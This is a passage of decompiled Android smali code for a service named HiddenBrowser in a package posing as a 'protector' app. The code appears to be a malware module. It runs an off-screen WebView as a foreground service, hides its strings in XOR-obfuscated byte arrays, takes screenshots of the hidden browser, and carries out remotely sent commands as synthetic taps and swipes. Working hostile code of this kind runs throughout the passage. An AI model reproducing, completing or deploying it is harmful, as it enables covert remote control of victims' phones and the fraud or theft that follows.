    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/16 v0, 0x2d0

    const/high16 v1, 0x40000000    # 2.0f

    invoke-static {v0, v1}, Landroid/view/View$MeasureSpec;->makeMeasureSpec(II)I

    move-result v0

    const/16 v3, 0x500

    invoke-static {v3, v1}, Landroid/view/View$MeasureSpec;->makeMeasureSpec(II)I

    move-result v1

    invoke-virtual {p2, v0, v1}, Landroid/view/View;->measure(II)V

    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {p2}, Landroid/view/View;->getMeasuredWidth()I

    move-result v0

    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/view/View;->getMeasuredHeight()I

    move-result v1

    invoke-virtual {p2, v2, v2, v0, v1}, Landroid/view/View;->layout(IIII)V

    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {p2, p1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-static {}, Lcom/icontrol/protector/HiddenBrowser;->q()Z

    move-result p1

    if-nez p1, :cond_4

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/icontrol/protector/HiddenBrowser;->a(Landroid/content/Context;)V

    :cond_4
    return-void

    :array_0
    .array-data 1
        0x6at
        0x70t
        -0x20t
        -0x7ft
        -0x6ct
        0x7ft
        0x64t
        0x44t
    .end array-data

    :array_1
    .array-data 1
        -0x2bt
        -0x6at
        -0x2bt
        -0x3bt
        0x6et
        0x5ft
        -0x26t
        0x6ct
        -0x23t
        -0x6ct
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x4et
        -0x7t
        -0x46t
        -0x5et
        0x2t
        0x3at
        -0xct
        0xft
    .end array-data

    :array_3
    .array-data 1
        0x2at
        0x8t
        -0x4t
        -0x2dt
        -0x34t
        0x2dt
        -0x10t
        0x1t
        0x30t
        0x8t
        -0x1ct
    .end array-data

    :array_4
    .array-data 1
        0x53t
        0x67t
        -0x77t
        -0x59t
        -0x47t
        0x4ft
        -0x6bt
        0x2ft
    .end array-data

    :array_5
    .array-data 1
        0x15t
        -0xat
        -0x3et
        0x6et
        -0x2et
        -0x41t
        -0x4dt
        0x45t
        0x6dt
        -0x49t
        -0x78t
        0x27t
        -0x6at
        -0x61t
        -0x45t
        0x4t
        0x2dt
        -0x1ft
        -0x7dt
        0x27t
        -0x1t
        -0x43t
        -0x4at
        0x18t
        0x37t
        -0x10t
        -0x24t
        0x27t
        -0x71t
        -0x20t
        -0x17t
        0x4at
        0xbt
        -0x2ct
        -0x6bt
        0x46t
        -0x71t
        -0x19t
        -0x1ct
        0x3at
        0x78t
        -0x25t
        -0x33t
        0x6et
        -0x2et
        -0x49t
        -0x3t
        0x3et
        0x8t
        -0x58t
        -0x7t
        0x29t
        -0x74t
        -0x1ft
        -0x1et
        0x5ct
        0x6at
        -0x53t
        -0x6at
        0x37t
        -0x71t
        -0x19t
        -0x17t
        0x4at
        0x2ft
        -0x11t
        -0x6ft
        0x27t
        -0x1t
        -0x5dt
        -0x5et
        0x6t
        0x3dt
        -0x32t
        -0x23t
        0x65t
        -0xbt
        -0x46t
        -0x5at
        0x45t
        0x6dt
        -0x56t
        -0x71t
        0x29t
        -0x73t
        -0x1bt
        -0xet
        0x42t
        0x13t
        -0x2ft
        -0x14t
        0x4at
        -0xet
        -0x1t
        -0xet
        0x6t
        0x31t
        -0xet
        -0x23t
        0x27t
        -0x7t
        -0x4at
        -0x4ft
        0x1t
        0x37t
        -0x50t
        -0x68t
        0x51t
        -0x25t
        -0x5ft
        -0x5ft
        0x3t
        0x37t
        -0x9t
        -0x69t
        0x33t
        -0x70t
        -0x1dt
        -0xet
        0x29t
        0x30t
        -0x15t
        -0x29t
        0x6at
        -0x25t
        -0x4t
        -0x1dt
        0x5bt
        0x6et
        -0x49t
        -0x78t
        0x29t
        -0x75t
        -0x15t
        -0x1at
        0x5ft
        0x76t
        -0x58t
        -0x80t
        0x30t
        -0x62t
        -0x62t
        -0x43t
        0x8t
        0x31t
        -0xbt
        -0x23t
        0x27t
        -0x13t
        -0x4et
        -0x4ct
        0xbt
        0x2at
        -0x10t
        -0x69t
        0x32t
        -0x73t
        -0x1ct
        -0x4t
        0x59t
        0x6et
        -0x47t
        -0x1dt
        0x41t
        -0x4t
        -0x74t
        -0x65t
        0x2bt
        0x1at
        -0x4at
        -0x2t
        0x45t
        -0x76t
        -0x6et
        -0x17t
        0x2ct
        0x1at
        -0x28t
        -0x12t
        0x28t
        -0x76t
        -0x20t
        -0x1et
        0x44t
        0x68t
        -0x49t
        -0x78t
        0x29t
        -0x73t
        -0x16t
        -0x4t
        0x5bt
        0x69t
        -0x56t
        -0x7dt
        0x5at
    .end array-data

    :array_6
    .array-data 1
        0x58t
        -0x67t
        -0x48t
        0x7t
        -0x42t
        -0x2dt
        -0x2et
        0x6at
    .end array-data

    :array_7
    .array-data 1
        0x47t
        0x6ft
        -0x10t
        0x72t
        0x20t
        -0x7dt
        -0x54t
        0xbt
        0x3ft
        0x2et
        -0x46t
        0x3bt
        0x64t
        -0x5dt
        -0x5ct
        0x4at
        0x7ft
        0x78t
        -0x4ft
        0x3bt
        0xdt
        -0x7ft
        -0x57t
        0x56t
        0x65t
        0x69t
        -0x12t
        0x3bt
        0x7dt
        -0x24t
        -0xat
        0x4t
        0x58t
        0x65t
        -0x12t
        0x76t
        0x25t
        -0x31t
        -0x7dt
        0x4bt
        0x7et
        0x65t
        -0x56t
        0x2at
        0x7et
        -0x31t
        -0x63t
        0x56t
        0x65t
        0x29t
        -0x56t
        0x5at
        0x3ct
        -0x61t
        -0x5ft
        0x41t
        0x5dt
        0x65t
        -0x18t
        0x50t
        0x25t
        -0x65t
        -0x1et
        0x11t
        0x39t
        0x37t
        -0x5ct
        0x28t
        0x7at
        -0x31t
        -0x1bt
        0x6ft
        0x42t
        0x54t
        -0x39t
        0x57t
        0x60t
        -0x31t
        -0x5ft
        0x4dt
        0x61t
        0x65t
        -0x56t
        0x5ct
        0x29t
        -0x74t
        -0x5at
        0x4bt
        0x23t
        0x20t
        -0x37t
        0x73t
        0x3et
        -0x80t
        -0x60t
        0x41t
        0x25t
        0x31t
        -0x45t
        0x2dt
        0x62t
        -0x21t
        -0x1dt
        0x11t
        0x32t
        0x34t
        -0x41t
        0x35t
        0x7dt
        -0x29t
        -0x6t
        0x4t
        0x47t
        0x6ft
        -0x18t
        0x72t
        0x20t
        -0x76t
        -0x13t
        0x77t
        0x6bt
        0x66t
        -0x15t
        0x69t
        0x25t
        -0x40t
        -0x8t
        0x17t
        0x3dt
        0x2et
        -0x47t
        0x2dt
    .end array-data

    :array_8
    .array-data 1
        0xat
        0x0t
        -0x76t
        0x1bt
        0x4ct
        -0x11t
        -0x33t
        0x24t
    .end array-data

    :array_9
    .array-data 1
        -0x5ft
        -0x3bt
        -0x2bt
    .end array-data

    :array_a
    .array-data 1
        -0x63t
        -0x5at
        -0x15t
        -0x15t
        -0x5at
        0x10t
        -0x1dt
        0x73t
    .end array-data

    :array_b
    .array-data 1
        0x61t
        0x31t
        -0x4at
    .end array-data

    :array_c
    .array-data 1
        0x5dt
        0x52t
        -0x78t
        -0x2et
        -0x55t
        -0x15t
        -0x71t
        0x1bt
    .end array-data
.end method

.method private v(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_0

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    const/4 v1, 0x1

    invoke-static {p0, v0, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/qj;->a(Lcom/icontrol/protector/HiddenBrowser;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_0
    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/HiddenBrowser$g;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/HiddenBrowser$g;-><init>(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public c(Landroid/content/Context;)V
    .locals 2

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->U:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/HiddenBrowser;->h:J

    return-void
.end method

.method public m(Landroid/webkit/WebView;)Landroid/graphics/Bitmap;
    .locals 3

    .line 1
    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/view/View;->getDrawingCache(Z)Landroid/graphics/Bitmap;

    move-result-object p1

    const/16 v1, 0x2d0

    const/16 v2, 0x500

    invoke-static {p1, v1, v2, v0}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object p1

    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v1, v0}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    return-object p1
.end method

.method public n()V
    .locals 4

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    const/16 v2, 0x11

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x3e8

    invoke-interface {v0, v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    iput-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    :cond_0
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ce;->a()V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->l()Lntidisestablish/neumonoul/floccinaucinih/da;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/da;->a()V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    iput-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    :cond_1
    return-void

    :array_0
    .array-data 1
        0x58t
        -0x4et
        0x68t
        -0x3bt
        0x40t
        -0x3ct
        0x66t
        -0x18t
        0x4ct
        -0x45t
        0x65t
        -0x1bt
        0x46t
        -0x37t
        0x6at
        -0x53t
        0x6ft
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1bt
        -0x22t
        0x7t
        -0x4at
        0x29t
        -0x56t
        0x1t
        -0x38t
    .end array-data
.end method

.method public o([Ljava/lang/String;Landroid/content/Context;)V
    .locals 12

    .line 1
    const-string v0, ""

    const/4 v1, 0x0

    aget-object v2, p1, v1

    new-instance v3, Landroid/os/Handler;

    invoke-virtual {p2}, Landroid/content/Context;->getMainLooper()Landroid/os/Looper;

    move-result-object p2

    invoke-direct {v3, p2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result p2

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x4

    const/4 v7, 0x5

    const/16 v8, 0x8

    const/4 v9, 0x1

    sparse-switch p2, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array p2, v7, [B

    fill-array-data p2, :array_0

    new-array v10, v8, [B

    fill-array-data v10, :array_1

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v1

    goto/16 :goto_1

    :sswitch_1
    new-array p2, v7, [B

    fill-array-data p2, :array_2

    new-array v10, v8, [B

    fill-array-data v10, :array_3

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v6

    goto :goto_1

    :sswitch_2
    new-array p2, v6, [B

    fill-array-data p2, :array_4

    new-array v10, v8, [B

    fill-array-data v10, :array_5

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v5

    goto :goto_1

    :sswitch_3
    new-array p2, v6, [B

    fill-array-data p2, :array_6

    new-array v10, v8, [B

    fill-array-data v10, :array_7

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v9

    goto :goto_1

    :sswitch_4
    new-array p2, v4, [B

    fill-array-data p2, :array_8

    new-array v10, v8, [B

    fill-array-data v10, :array_9

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v7

    goto :goto_1

    :sswitch_5
    const/4 p2, 0x6

    new-array p2, p2, [B

    fill-array-data p2, :array_a

    new-array v10, v8, [B

    fill-array-data v10, :array_b

    invoke-static {p2, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    move p2, v4

    goto :goto_1

    :cond_0
    :goto_0
    const/4 p2, -0x1

    :goto_1
    const-wide/16 v10, 0x1

    if-eqz p2, :cond_7

    if-eq p2, v9, :cond_6

    if-eq p2, v5, :cond_5

    if-eq p2, v4, :cond_3

    if-eq p2, v6, :cond_2

    if-eq p2, v7, :cond_1

    goto/16 :goto_6

    :cond_1
    aget-object p1, p1, v9

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    new-instance p2, Lcom/icontrol/protector/HiddenBrowser$f;

    invoke-direct {p2, p0, p1}, Lcom/icontrol/protector/HiddenBrowser$f;-><init>(Lcom/icontrol/protector/HiddenBrowser;I)V

    :goto_2
    invoke-virtual {v3, p2, v10, v11}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_6

    :cond_2
    aget-object p2, p1, v9

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/Integer;->intValue()I

    move-result p2

    aget-object p1, p1, v5

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    new-instance v0, Lcom/icontrol/protector/HiddenBrowser$e;

    invoke-direct {v0, p0, p2, p1}, Lcom/icontrol/protector/HiddenBrowser$e;-><init>(Lcom/icontrol/protector/HiddenBrowser;II)V

    invoke-virtual {v3, v0, v10, v11}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_6

    :cond_3
    aget-object p1, p1, v9

    new-array p2, v9, [B

    aput-byte v8, p2, v1

    new-array v2, v8, [B

    fill-array-data v2, :array_c

    invoke-static {p2, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    array-length p2, p1

    new-array p2, p2, [Landroid/graphics/Point;

    move v2, v1

    :goto_3
    array-length v4, p1

    if-ge v2, v4, :cond_4

    :try_start_0
    aget-object v4, p1, v2

    new-array v6, v9, [B

    const/16 v7, -0x10

    aput-byte v7, v6, v1

    new-array v7, v8, [B

    fill-array-data v7, :array_d

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    new-array v6, v9, [B

    const/16 v7, 0x32

    aput-byte v7, v6, v1

    new-array v7, v8, [B

    fill-array-data v7, :array_e

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    new-array v6, v5, [B

    fill-array-data v6, :array_f

    new-array v7, v8, [B

    fill-array-data v7, :array_10

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    aget-object v6, v4, v1

    invoke-static {v6}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    aget-object v4, v4, v9

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    new-instance v7, Landroid/graphics/Point;

    invoke-direct {v7, v6, v4}, Landroid/graphics/Point;-><init>(II)V

    aput-object v7, p2, v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    move-exception v4

    invoke-virtual {v4}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_4
    new-instance p1, Lcom/icontrol/protector/HiddenBrowser$d;

    invoke-direct {p1, p0, p2}, Lcom/icontrol/protector/HiddenBrowser$d;-><init>(Lcom/icontrol/protector/HiddenBrowser;[Landroid/graphics/Point;)V

    :goto_5
    invoke-virtual {v3, p1, v10, v11}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_6

    :cond_5
    aget-object p1, p1, v9

    new-instance p2, Lcom/icontrol/protector/HiddenBrowser$c;

    invoke-direct {p2, p0, p1}, Lcom/icontrol/protector/HiddenBrowser$c;-><init>(Lcom/icontrol/protector/HiddenBrowser;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_6
    aget-object p1, p1, v9

    new-instance p2, Lcom/icontrol/protector/HiddenBrowser$b;

    invoke-direct {p2, p0, p1}, Lcom/icontrol/protector/HiddenBrowser$b;-><init>(Lcom/icontrol/protector/HiddenBrowser;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_7
    new-instance p1, Lcom/icontrol/protector/HiddenBrowser$a;

    invoke-direct {p1, p0}, Lcom/icontrol/protector/HiddenBrowser$a;-><init>(Lcom/icontrol/protector/HiddenBrowser;)V

    goto :goto_5

    :goto_6
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x361a1933 -> :sswitch_5
        0x1a923 -> :sswitch_4
        0x32c4e6 -> :sswitch_3
        0x36452d -> :sswitch_2
        0x5a5c588 -> :sswitch_1
        0x5c306d8 -> :sswitch_0
    .end sparse-switch

    :array_0
    .array-data 1
        -0x7ct
        0x79t
        0x73t
        0x69t
        -0x80t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x1ft
        0x17t
        0x7t
        0xct
        -0xet
        -0x63t
        0x26t
        0x23t
    .end array-data

    :array_2
    .array-data 1
        0x3t
        -0x36t
        0x51t
        -0x5bt
        -0x6ft
    .end array-data

    nop

    :array_3
    .array-data 1
        0x60t
        -0x5at
        0x38t
        -0x3at
        -0x6t
        0x54t
        0x51t
        0x40t
    .end array-data

    :array_4
    .array-data 1
        0x7bt
        0x22t
        -0x4dt
        -0x39t
    .end array-data

    :array_5
    .array-data 1
        0xft
        0x47t
        -0x35t
        -0x4dt
        0x18t
        -0x6bt
        -0x2bt
        -0x59t
    .end array-data

    :array_6
    .array-data 1
        0x59t
        0x3ct
        0x22t
        0x2et
    .end array-data

    :array_7
    .array-data 1
        0x35t
        0x53t
        0x43t
        0x4at
        0x46t
        0x77t
        0x7dt
        -0x21t
    .end array-data

    :array_8
    .array-data 1
        -0x64t
        -0x7dt
        -0x5at
    .end array-data

    :array_9
    .array-data 1
        -0xet
        -0x1et
        -0x30t
        0x2t
        0x3t
        0x7et
        -0x56t
        -0x5t
    .end array-data

    :array_a
    .array-data 1
        0xft
        0x45t
        0x65t
        0x44t
        -0xbt
        -0x39t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x7ct
        0x26t
        0x17t
        0x2bt
        -0x67t
        -0x55t
        -0x53t
        0x55t
    .end array-data

    :array_c
    .array-data 1
        0x32t
        -0x18t
        0x25t
        0x21t
        -0x4ct
        -0x45t
        0x43t
        0x13t
    .end array-data

    :array_d
    .array-data 1
        -0x28t
        0x45t
        -0x26t
        -0x1ct
        0x41t
        0x54t
        -0x59t
        -0x78t
    .end array-data

    :array_e
    .array-data 1
        0x1bt
        0x17t
        0x14t
        -0x39t
        -0x79t
        -0x60t
        0x34t
        -0x69t
    .end array-data

    :array_f
    .array-data 1
        0x40t
        -0x6bt
    .end array-data

    nop

    :array_10
    .array-data 1
        0x6ct
        -0x4bt
        0x3dt
        -0x17t
        0x60t
        -0x21t
        -0x7bt
        0x50t
    .end array-data
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sput-object p0, Lcom/icontrol/protector/HiddenBrowser;->g:Lcom/icontrol/protector/HiddenBrowser;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/HiddenBrowser;->v(Landroid/content/Context;)V

    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    invoke-virtual {p0}, Lcom/icontrol/protector/HiddenBrowser;->n()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    const/4 p2, 0x2

    const/16 p3, 0x8

    :try_start_0
    new-array v0, p3, [B

    fill-array-data v0, :array_0

    new-array v1, p3, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Lntidisestablish/neumonoul/floccinaucinih/ks;

    invoke-direct {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;-><init>()V

    iput-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    new-array v0, p3, [B

    fill-array-data v0, :array_2

    new-array v1, p3, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v1, p2, [B

    fill-array-data v1, :array_4

    new-array p3, p3, [B

    fill-array-data p3, :array_5

    invoke-static {v1, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p1, p3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p0, Lcom/icontrol/protector/HiddenBrowser;->g:Lcom/icontrol/protector/HiddenBrowser;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    invoke-direct {p0, p3}, Lcom/icontrol/protector/HiddenBrowser;->v(Landroid/content/Context;)V

    invoke-direct {p0, v0, p1}, Lcom/icontrol/protector/HiddenBrowser;->u(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    return p2

    nop

    :array_0
    .array-data 1
        0x41t
        0x39t
        -0x4dt
        0x1bt
        -0x8t
        -0x5ct
        0x0t
        -0x6dt
    .end array-data

    :array_1
    .array-data 1
        0x32t
        0x4dt
        -0x2et
        0x69t
        -0x74t
        -0x2ft
        0x72t
        -0x1t
    .end array-data

    :array_2
    .array-data 1
        -0x48t
        -0x13t
        0x1t
        0x14t
        -0x75t
        0x5at
        -0x76t
        0x5ft
    .end array-data

    :array_3
    .array-data 1
        -0x35t
        -0x67t
        0x60t
        0x66t
        -0x1t
        0x2ft
        -0x8t
        0x33t
    .end array-data

    :array_4
    .array-data 1
        0x7et
        0x33t
    .end array-data

    nop

    :array_5
    .array-data 1
        0xbt
        0x52t
        0x52t
        0x17t
        0x5at
        -0x34t
        0x16t
        -0x70t
    .end array-data
.end method

.method public t([Landroid/graphics/Point;J)V
    .locals 20

    .line 1
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    array-length v0, v2

    const/4 v3, 0x1

    sub-int/2addr v0, v3

    int-to-long v4, v0

    div-long v4, p2, v4

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v14

    const/4 v10, 0x0

    const/4 v0, 0x0

    aget-object v0, v2, v0

    iget v6, v0, Landroid/graphics/Point;->x:I

    int-to-float v11, v6

    iget v0, v0, Landroid/graphics/Point;->y:I

    int-to-float v12, v0

    const/4 v13, 0x0

    move-wide v6, v14

    move-wide v8, v14

    invoke-static/range {v6 .. v13}, Landroid/view/MotionEvent;->obtain(JJIFFI)Landroid/view/MotionEvent;

    move-result-object v13

    iget-object v0, v1, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0, v13}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    move v0, v3

    :goto_0
    array-length v8, v2

    if-ge v0, v8, :cond_0

    add-long v16, v6, v4

    const/4 v10, 0x2

    aget-object v6, v2, v0

    iget v7, v6, Landroid/graphics/Point;->x:I

    int-to-float v11, v7

    iget v6, v6, Landroid/graphics/Point;->y:I

    int-to-float v12, v6

    const/16 v18, 0x0

    move-wide v6, v14

